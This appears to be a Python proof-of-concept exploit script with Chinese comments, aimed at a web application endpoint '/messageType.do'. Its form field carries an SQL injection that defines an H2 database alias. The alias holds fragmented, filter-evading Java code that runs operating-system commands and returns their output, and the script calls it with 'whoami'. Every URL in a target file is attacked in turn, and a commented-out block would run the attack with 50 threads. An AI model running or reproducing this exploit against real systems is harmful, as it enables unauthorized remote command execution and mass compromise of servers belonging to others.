import requests
import warnings
warnings.filterwarnings("ignore")
# 定义请求的URL和头部
def poc(url):
    url = f"{url}/messageType.do"  # 将 <host> 替换为实际的目标主机
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7"
    }

    # 定义请求体
    data = """
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="method"

create
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="typeName"

1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagm('whoami');--
------WebKitFormBoundaryTm8YXcJeyKDClbU7--
"""

    # 发送请求
    try:    
        response = requests.post(url, headers=headers, data=data,verify=False,timeout=5)
            # 输出响应
        if response.status_code==200:
            # print(url)
            # if "system" in response.text:
            print(url)
            print("=====SCUUESSFULL============")
            print(response.text)

    except:
        pass

urls = open("urls.txt","r").readlines()
for url in urls:
    url = url.strip()
    poc(url)

# from concurrent.futures import ThreadPoolExecutor
# # 批量检测
# with open('urls.txt', 'r') as file:
#     urls = [u.strip() for u in file.readlines()][200:]
# with ThreadPoolExecutor(max_workers=50) as executor:
#     executor.map(poc, urls)